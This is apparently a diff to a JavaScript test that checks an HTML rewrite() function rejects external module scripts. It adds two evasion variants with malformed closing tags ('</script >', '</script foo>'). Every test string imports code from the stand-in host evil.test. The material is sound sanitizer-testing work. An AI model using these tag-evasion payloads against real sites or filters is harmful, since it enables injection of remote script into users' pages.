@@ -64,6 +64,8 @@ test("rejects every kind of unreviewed external code", () => {
     `<script type="module">import x from "https://evil.test/x.mjs"</script>`,
     `<script type="module">await import('https://evil.test/x.mjs')</script>`,
     `<script type="importmap">{"imports":{"x":"https://evil.test/x.mjs"}}</script>`,
+    `<script type="module">import x from "https://evil.test/x.mjs"</script >`,
+    `<script type="module">import x from "https://evil.test/x.mjs"</script foo>`,
   ]) {
     assert.throws(() => rewrite(html), /evil\.test/);
   }
